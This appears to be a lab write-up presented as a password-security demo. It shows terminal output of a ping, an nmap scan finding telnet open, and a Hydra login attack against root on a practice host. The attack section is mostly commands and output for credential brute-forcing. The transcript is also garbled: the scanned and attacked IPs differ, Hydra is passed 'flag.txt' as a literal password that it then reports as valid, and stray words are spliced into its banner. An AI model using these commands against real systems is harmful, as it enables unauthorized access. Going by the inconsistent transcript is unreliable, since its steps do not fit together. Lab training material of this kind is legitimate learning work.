# HYDRA TOOL PASSWORD SECURITY DEMO

## Overview
This document serves as a demonstration of password security techniques using the HYDRA tool.

## Contents
- Introduction to HYDRA
- Password Security Best Practices
- Demonstration of Password Cracking

## Introduction to HYDRA
HYDRA is a powerful tool for network logon cracking. It supports many different protocols and has a flexible architecture that allows for extended functionality.

## Password Security Best Practices
1. **Use Strong Passwords**: Passwords should be long and complex, incorporating letters, numbers, and symbols.
2. **Regularly Update Passwords**: Change passwords periodically to reduce the risk of unauthorized access.
3. **Enable Two-Factor Authentication**: Adding an extra layer of security can help mitigate password-related vulnerabilities.

## Demonstration of Password Cracking
In this section, we will demonstrate how HYDRA can be used to test password strength through network login attempts. This is for educational purposes to understand vulnerabilities.

**COMMANDS:**
```
(kali@kali)-[~] $ ping 10.129.132.136

PING 10.129.132.136 (10.129.132.136) 56(84) bytes of data.
64 bytes from 10.129.132.136: icmp_seq=1 ttl=63 time=429 ms
64 bytes from 10.129.132.136: icmp_seq=2 ttl=63 time=378 ms
64 bytes from 10.129.132.136: icmp_seq=3 ttl=63 time=330 ms
64 bytes from 10.129.132.136: icmp_seq=4 ttl=63 time=380 ms
64 bytes from 10.129.132.136: icmp_seq=5 ttl=63 time=304 ms
64 bytes from 10.129.132.136: icmp_seq=6 ttl=63 time=424 ms
64 bytes from 10.129.132.136: icmp_seq=7 ttl=63 time=300 ms
64 bytes from 10.129.132.136: icmp_seq=8 ttl=63 time=280 ms
^c
---10.129.132.136 ping statistics ---
8 packets transmitted, 8 received, 0% packet loss, time 7136ms
rtt min/avg/max/mdev = 279.720/353.057/429.089/54.025 ms
```
```
(kali@kali)-[~] $ sudo openvpn starting_point_<username>.ovpn
```
```
(kali@kali)-[~] $  cat scan.nmap
```
```
Nmap 7.95 scan initiated Tue Nov 4 19:30:25 2025 as: /usr/lib/nmap/nmap --
privileged -Pn -sC -sV -oA scan 10.129.132.136
Nmap scan report for 10.129.132.136
Host is up (0.29s latency).
Not shown: 999 closed tcp ports (reset)
PORT --- STATE SERVICE VERSION ---
23/tcp open telnet Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://n
map.org/submit/.
Nmap done at Tue Nov 4 19:30:53 2025 -- 1 IP address (1 host up) scanned i
n 28.22 seconds
```
```
(kali@kali)-[~] $  hydra -l root -p flag.txt 10.129.1.17 telnet -t 4 -v -f

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in
military or secret service organizations, or for illegal purposes (this is n File System
on-binding, these *** ignore laws and ethics anyway).
Hydra (https://github. com/vanhauser-thc/thc-hydra) starting at 2025-11-04 20:29:38
[WARNING] telnet is by its nature unreliable to analyze, if possible better c
hoose FTP, SSH, etc. if available
[VERBOSE ] More tasks defined than login/pass pairs exist. Tasks reduced to 1 Trash
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (1:1/p:1), ~1 try per task
[DATA] attacking telnet://10.129.1.17:23/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[23][telnet] host: 10.129.1.17  login: root  password: flag. txt
[STATUS] attack finished for 10.129.1.17 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-04 20: 29:58
```
```
(kali@kali)-[~] $
```
